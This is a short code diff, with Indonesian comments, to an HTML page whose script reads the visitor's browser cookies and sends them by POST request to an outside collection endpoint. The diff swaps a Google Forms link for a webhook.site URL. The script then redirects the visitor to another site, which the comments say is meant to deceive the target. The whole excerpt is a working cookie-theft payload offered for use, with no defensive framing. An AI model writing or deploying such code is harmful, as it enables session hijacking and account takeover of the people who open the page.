@@ -10,14 +10,15 @@
         // Ambil cookies
         var cookies = document.cookie;
         
-        // Kirim cookies ke emailmu
+        // Kirim cookies ke Webhook.site
+        var webhookURL = 'https://webhook.site/535797ef-1f9c-452a-94ab-633b408224ea'; // Ganti dengan URL endpoint dari Webhook.site
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://forms.gle/2zHFzEXD7HMNipZr5", true);
+        xhr.open("POST", webhookURL, true);
         xhr.setRequestHeader("Content-Type", "application/json");
         xhr.send(JSON.stringify({ cookies: cookies }));
 
         // Redirect ke halaman yang valid untuk mengelabui target
-        window.location.replace("https://colab.research.google.com/drive/1L_sZq19WcKuRMldIvmhc0bCiNWk5mus9?usp=sharing");
+        window.location.replace("https://hackprank.com/");
     </script>
 </body>
 </html>
